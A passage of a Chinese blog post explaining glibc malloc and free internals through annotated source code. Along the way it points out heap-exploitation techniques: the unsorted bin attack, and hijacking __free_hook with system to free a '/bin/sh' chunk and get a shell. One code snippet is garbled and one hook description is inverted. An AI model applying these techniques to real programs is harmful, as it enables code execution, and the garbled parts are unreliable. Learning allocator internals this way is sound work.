therefore</span></span><br><span class="line"><span class="comment">                     have to perform a complete insert here.  */</span></span><br><span class="line">            bck = unsorted_chunks (av);</span><br><span class="line">            fwd = bck-&gt;fd;</span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">            &#123;</span><br><span class="line">                errstr = <span class="string">&quot;malloc(): cor</span></span><br><span class="line"><span class="string">                    rupted unsorted chunks&quot;</span>;</span><br><span class="line">                <span class="keyword">goto</span> errout;</span><br><span class="line">            &#125;</span><br><span class="line">            remainder-&gt;bk = bck;</span><br><span class="line">            remainder-&gt;fd = fwd;</span><br><span class="line">            bck-&gt;fd = remainder;</span><br><span class="line">            fwd-&gt;bk = remainder;</span><br><span class="line">            <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">            &#123;</span><br><span class="line">                remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                      (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">            set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">            set_foot (remainder, remainder_size);</span><br><span class="line">        &#125;</span><br><span class="line">        check_malloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这边就看这个最小能满足的<code>nb</code>是否在<code>small bin</code>的范围内。不在则执行，其实如果在的话，那前面有一个<code>small bin</code>的范围判断，如果<code>small bin</code>范围那，<code>idx</code>就是<code>small bin</code>，不在则是<code>large bin</code>的<code>idx</code>。<code>small bin</code>之前已经判断过一遍了，并且判断策略也跟之前不一样，所以这里加一个<code>!in_small_bin_range</code>的判断还是很有必要的。</p><p>来看下面的if语句，两个条件。</p><ol><li><code>(victim = first (bin)) != bin</code>：这个bin里面有<code>chunk</code>，并使<code>victim=bin-&gt;fd</code></li><li><code>(unsigned long) (victim-&gt;size) &gt;= (unsigned long) (nb)</code>：找到目标chunk的size要大于等于这个最小能满足的size  nb。</li></ol><p>同时满足那么就可能要取这一块chunk来分配了，正如注释所说，如果bin为空或者最大的chunk还是比较小，那就跳过这个逻辑。然后<code>victim = victim-&gt;bk_nextsize</code>，这里<code>victim</code>是最大块，最大块的<code>bk_nextsize</code>就是最小块，这里应该也是尽量寻找最小能满足的块。正如循环所描述，如果<code>victim</code>的<code>chunk size</code>比我所需的最小能满足的<code>chunk size</code> <code>nb</code>还小，那就去寻找比他大的，因为是递增，所以能保证在<code>chunk</code>当中我一定会找到一个最小能满足的<code>chunk</code>。</p><p>这里解释一下两个最小能满足的意思：</p><p>首先<code>nb</code>是指用户需要的最小能满足的块的<code>size</code>，比如我只需要1个字节，但是我最小的<code>chunk size</code>都是<code>0x20</code>了，<code>0x20</code>的<code>chunk</code>就是对用户最小能满足的<code>chunk size</code>了。</p><p>如果能找到<code>size=nb</code>的块，当然是最好不过了，但是现实往往不会那么顺利，比如我只有一个<code>0x30</code>的块，如果我只有<code>0x30</code>而没有<code>0x20</code>的块，那么<code>0x30</code>就是我所有<code>free</code>块当中的最小能满足，其实这里<code>nb</code>应该叫最优能满足，但是我还是习惯这么叫了hhh。</p><p>然后呢找到这个之后就<code>unlink</code>这个块，把它从链中删除，拿出来之后进行一个判断，如果切割之后的块小于MINSIZE，那就不切割了，直接把它物理相邻的下一个快<code>prev_inuse</code>位设1，这个块就直接返回给用户了。否则就是切割，设置各种东西，这个前面有差不多的代码，我们主要看看剩下的块去哪里了，很明显，重新链入<code>unsorted bin</code>了。后面有一个<code>check</code>，如果<code>unsorted bin-&gt;fd-&gt;bk!=unsorted bin</code>，那么报错退出。这里需要注意，它只检测了<code>unsorted bin-&gt;fd-&gt;bk</code>是否等于那个<code>unsorted bin</code>，对于堆块来说我就是只检测了<code>bk</code>指针，这意味着<code>fd</code>指针如果修改为任意值不会在这里被检测到，这是一个利用小技巧，也只有你读过源码后才能好好理解这个<code>unsorted bin attack</code>了。然后如果剩余大小不在<code>small bin</code>范围内把<code>nextsize</code>指针全部清空，其它就是正常返回了。如果被切割的剩下<code>chunk</code>不在<code>small bin</code>范围内，就会清空它的<code>fd_nextsize</code>和<code>bk_nextsize</code>。因为它要回到<code>unsorted bin</code>里面，这两个字段就没什么用了，就会被清空。</p><h4 id="第七小块"><a href="#第七小块" class="headerlink" title="第七小块"></a>第七小块</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">++idx;</span><br><span class="line">bin = bin_at (av, idx);</span><br><span class="line">block = idx2block (idx);</span><br><span class="line"><span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">bit = idx2bit (idx);</span><br></pre></td></tr></table></figure><p>我们来讲一讲<code>arena</code>的<code>binmap</code>结构，这个用于快速检索一个<code>bin</code>是否为空，每一个<code>bit</code>表示对应的<code>bin</code>中是否存在空闲<code>chunk</code>，虽然不知道为什么前面没有用到。这一段就是说，如果<code>large bin</code>搜索完了都没有找到合适的<code>chunk</code>，那么就去下一个<code>idx</code>里面寻找，这很合理。然后一共有4个int，每个<code>int</code>32位表示一块<code>map</code>，一共表示<code>128</code>位。</p><h4 id="第八小块"><a href="#第八小块" class="headerlink" title="第八小块"></a>第八小块</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(;;)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">    <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">                <span class="keyword">goto</span> use_top;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">        bit = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ........</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们来看看两个条件</p><ol><li><code>bit&gt;map</code>：如果这个位的权值都比它整个的<code>map</code>都大了，说明<code>map</code>上那个<code>bit</code>的权值必定为0</li><li><code>bit==0</code>：如果这个<code>bit</code>都是0说明这个<code>index</code>也不对。</li></ol><p>满足其一就看看别的<code>index</code>。</p><p>然后如果说<code>map==0</code>，说明这整个<code>block</code>都没有空闲块，就直接跳过，不为0则退出去执行下面的操作，如果超过了<code>block</code>的总数，那就说明<code>unsorted bin</code>和<code>large bin</code>中也没有合适的<code>chunk</code>，那我们就切割<code>top_chunk</code>了，这里用了一个<code>goto</code>跳转，我们后面分析。</p><h4 id="第九小块"><a href="#第九小块" class="headerlink" title="第九小块"></a>第九小块</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line"><span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    bin = next_bin (bin);</span><br><span class="line">    bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">    assert (bit != <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line">victim = last (bin);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line"><span class="keyword">if</span> (victim == bin)</span><br><span class="line">&#123;</span><br><span class="line">    av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">    bin = next_bin (bin);</span><br><span class="line">    bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>此时我已经找到了一个合适的<code>block</code>，然后就是看<code>block</code>的各个位了。从低位开始，如果检查到<code>map</code>那一位对应为0就找下一位，我们前面提到bk为<code>large bin</code>的最小块，所以先考虑它，当然不能说<code>map</code>里面说这里有它就有，我还得自己判断一下这个<code>bin</code>里面是不是真的有，如果没有(<code>bin-&gt;bk==bin</code>)，那么我就要及时把标志位清除然后<code>bit&lt;&lt;1</code>去寻找下一个<code>index</code>。</p><h4 id="最后一小块"><a href="#最后一小块" class="headerlink" title="最后一小块"></a>最后一小块</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">    assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb));</span><br><span class="line"></span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* unlink */</span></span><br><span class="line">    unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Exhaust */</span></span><br><span class="line">    <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">    &#123;</span><br><span class="line">        set_inuse_bit_at_offset (victim, size);</span><br><span class="line">        <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">        victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Split */</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        remainder = chunk_at_offset (victim, nb);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">        have to perform a complete insert here.  */</span></span><br><span class="line">        bck = unsorted_chunks (av);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">        &#123;</span><br><span class="line">            errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">        &#125;</span><br><span class="line">        remainder-&gt;bk = bck;</span><br><span class="line">        remainder-&gt;fd = fwd;</span><br><span class="line">        bck-&gt;fd = remainder;</span><br><span class="line">        fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* advertise as last remainder */</span></span><br><span class="line">        <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">        av-&gt;last_remainder = remainder;</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">        &#123;</span><br><span class="line">            remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        set_head (victim, nb | PREV_INUSE |</span><br><span class="line">        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">        set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">        set_foot (remainder, remainder_size);</span><br><span class="line">    &#125;</span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果它确实有<code>chunk</code>呢？然后其实它还是跟前面一样的，在<code>large bin</code>中找到<code>chunk</code>的处理方式，<code>unlink</code>，切割，判断，设置标志位，切割后及时更新<code>last_remainder</code>，这里就是一个<code>large bin</code>的遍历。</p><p>还要讲一下的就是这个<code>check</code>，依旧是对<code>unsorted bin</code>的一个<code>check</code>，判断第一个<code>unsorted chunk</code>的<code>bk</code>指针是否指向<code>unsorted bin</code>的位置。这里需要把割剩下的<code>chunk</code>重新放回<code>unsorted bin</code>。至此整个<code>unsorted bin</code>和<code>large bin</code>的分配就讲完了。</p><h3 id="第六段：切割top-chunk"><a href="#第六段：切割top-chunk" class="headerlink" title="第六段：切割top_chunk"></a>第六段：切割top_chunk</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">use_top:</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">             (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">             search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">             less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">             be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">             limitations).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">             We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">             MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">             exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">             reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">             to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line"></span><br><span class="line">    victim = av-&gt;top;</span><br><span class="line">    size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">    &#123;</span><br><span class="line">        remainder_size = size - nb;</span><br><span class="line">        remainder = chunk_at_offset (victim, nb);</span><br><span class="line">        av-&gt;top = remainder;</span><br><span class="line">        set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                  (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">        set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">        check_malloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">             here for all block sizes.  */</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">            malloc_consolidate (av);</span><br><span class="line">            <span class="comment">/* restore original bin index */</span></span><br><span class="line">            <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">                idx = smallbin_index (nb);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                idx = largebin_index (nb);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">               */</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">            <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">                alloc_perturb (p, bytes);</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一步比较简单，就是说先从<code>av-&gt;top</code>拿到<code>top_chunk</code>的地址。判断大小尝试切割，如果不能切割，它也不会尽量去麻烦操作系统，先调用<code>malloc_consolidate</code>去合并所有的<code>fast bin</code>里面的<code>chunk</code>。然后合并之后接着步入之前的循环，重新找一次<code>small bin</code> <code>large bin</code> <code>unsorted bin</code>，因为现在可能已经有合适的<code>chunk</code>了对吧。</p><p>然后如果还是没有合适的呢？就会进入这里的<code>else</code>，调用<code>sysmalloc</code>去分配内存，一次还是分配<code>0x21000</code>的<code>chunk</code>作为新的<code>top_chunk</code>，原来的<code>top_chunk</code>将会被<code>free</code>，一般来说如果你没有改过<code>top_chunk</code>的<code>size</code>，那么新的和旧的<code>top_chunk</code>将会是物理相邻，如果<code>free</code> 的<code>top_chunk</code>不在<code>fast bin</code>范围内，那就会和新的<code>top_chunk</code>发生合并。那么这一整个<code>malloc</code>源码就解读完了，我们来做一下总结。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li><p>检查是否设置了<code>malloc_hook</code>，若设置了则跳转进入<code>malloc_hook</code>，若未设置则获取当前的分配区，进入<code>int_malloc</code>函数。</p></li><li><p>如果当前的分配区为空，则调用<code>sysmalloc</code>分配空间，返回指向新<code>chunk</code>的指针，否则进入下一步。</p></li><li><p>若用户申请的大小在<code>fast bin</code>的范围内，则考虑寻找对应<code>size</code>的<code>fast bin chunk</code>，判断该<code>size</code>的<code>fast bin</code>是否为空，不为空则取出第一个<code>chunk</code>返回，否则进入下一步。</p></li><li><p>如果用户申请的大小符合<code>small bin</code>的范围，则在相应大小的链表中寻找<code>chunk</code>，若<code>small bin</code>未初始化，则调用<code>malloc_consolidate</code>初始化分配器，然后继续下面的步骤，否则寻找对应的<code>small bin</code>的链表，如果该<code>size</code> 的<code>small bin</code>不为空则取出返回，否则继续下面的步骤。如果申请的不在<code>small bin</code>的范围那么调用<code>malloc_consolidate</code>去合并所有<code>fast bin</code>并继续下面的步骤。</p></li><li><p>用户申请的大小符合<code>large bin</code>或<code>small bin</code>链表为空，开始处理<code>unsorted bin</code>链表中的<code>chunk</code>。在<code>unsorted bin</code>链表中查找符合大小的<code>chunk</code>，若用户申请的大小为<code>small bin</code>，<code>unsorted bin</code>中只有一块chunk并指向<code>last_remainder</code>，且<code>chunk size</code>的大小大于<code>size+MINSIZE</code>，则对当前的<code>chunk</code>进行分割，更新分配器中的<code>last_remainder</code>，切出的<code>chunk</code>返回给用户，剩余的<code>chunk</code>回<code>unsorted bin</code>。否则进入下一步。</p></li><li><p>将当前的<code>unsorted bin</code>中的<code>chunk</code>取下，若其<code>size</code>恰好为用户申请的<code>size</code>，则将<code>chunk</code>返回给用户。否则进入下一步</p></li><li><p>获取当前<code>chunk size</code>所对应的bins数组中的头指针。（<code>large bin</code>需要保证从大到小的顺序，因此需要遍历）将其插入到对应的链表中。如果处理的chunk的数量大于<code>MAX_ITERS</code>则不在处理。进入下一步。</p></li><li><p>如果用户申请的空间的大小符合<code>large bin</code>的范围或者对应的small bin链表为空且<code>unsorted bin</code>链表中没有符合大小的<code>chunk</code>，则在对应的<code>large bin</code>链表中查找符合条件的<code>chunk</code>（即其大小要大于用户申请的<code>size</code>）。若找到相应的<code>chunk</code>则对<code>chunk</code>进行拆分，返回符合要求的<code>chunk</code>（无法拆分时整块返回）。否则进入下一步。</p></li><li><p>根据<code>binmap</code>找到表示更大<code>size</code>的<code>large bin</code>链表，若其中存在空闲的<code>chunk</code>，则将<code>chunk</code>拆分之后返回符合要求的部分，并更新<code>last_remainder</code>。否则进入下一步。</p></li><li><p>若<code>top_chunk</code>的大小大于用户申请的空间的大小，则将<code>top_chunk</code>拆分，返回符合用户要求的<code>chunk</code>，并更新<code>last_remainder</code>，否则进入下一步。</p></li><li><p>若<code>fast bin</code>不为空，则调用<code>malloc_consolidate</code>合并<code>fast bin</code>，重新回到第四步再次从<code>small bin</code>搜索。否则进入下一步。</p></li><li><p>调用<code>sysmalloc</code>分配空间，<code>free top chunk</code>返回指向新<code>chunk</code>的指针。</p></li><li><p>若<code>_int_malloc</code>函数返回的<code>chunk</code>指针为空，且当前分配区指针不为空，则再次尝试<code>_int_malloc</code></p></li><li><p>对<code>chunk</code>指针进行检查，主要检查<code>chunk</code>是否为<code>mmap</code>，且位于当前的分配区内。</p><h2 id="free源码分析"><a href="#free源码分析" class="headerlink" title="free源码分析"></a>free源码分析</h2></li></ol><p>那我们现在开始解读一下<code>free</code>的源码</p><h3 id="libc-free源码分析"><a href="#libc-free源码分析" class="headerlink" title="__libc_free源码分析"></a>__libc_free源码分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">__libc_free (<span class="keyword">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> (*hook) (<span class="keyword">void</span> *, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)                              <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  p = mem2chunk (mem);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))                       <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* see if the dynamic brk/mmap threshold needs adjusting */</span></span><br><span class="line">      <span class="keyword">if</span> (!mp_.no_dyn_threshold</span><br><span class="line">          &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold</span><br><span class="line">          &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)</span><br><span class="line">        &#123;</span><br><span class="line">          mp_.mmap_threshold = chunksize (p);</span><br><span class="line">          mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                      mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">        &#125;</span><br><span class="line">      munmap_chunk (p);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  ar_ptr = arena_for_chunk (p);</span><br><span class="line">  _int_free (ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>free</code>函数也是直接调用这里的<code>__libc_free</code>函数完成<code>chunk</code>的释放的操作的。</p><p>跟<code>malloc</code>一样，先读取<code>__free_hook</code>看看是否为空，如果为空则直接由<code>free_hook</code>指向的函数代为执行<code>free</code>，这里也是我们经常劫持的钩子函数，而且<code>free_hook</code>劫持起来比<code>malloc_hook</code>困难。但是一旦劫持成功也会很方便，就是说<code>malloc</code>_hook函数我只能写<code>one_gadget</code>，而一旦条件苛刻那么就还得调栈啊之类的一些操作。劫持到了<code>free_hook</code>我们就直接写<code>system</code>函数，然后<code>free</code>一个内容为<code>/bin/sh</code>的堆块就能稳定<code>get shell</code>。</p><p>然后执行<code>free(NULL)</code>无任何效果，直接返回。</p><p>将传入的指针转换为<code>chunk</code>的指针，因为用户得到的指针其实是<code>&amp;chunk-&gt;fd</code>，这里改为<code>chunk</code>的指针。然后这里需要寻找这个堆块的分配器，看看这个堆块是从哪里分配出来的。之后就是调用<code>_int_free</code>函数去真正释放chunk</p><h3 id="int-free源码分析"><a href="#int-free源码分析" class="headerlink" title="_int_free源码分析"></a>_int_free源码分析</h3><p>同样我们分成几段来讲解，总源码也不直接给了。</p><h4 id="第一段：free前的各种check"><a href="#第一段：free前的各种check" class="headerlink" title="第一段：free前的各种check"></a>第一段：free前的各种check</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 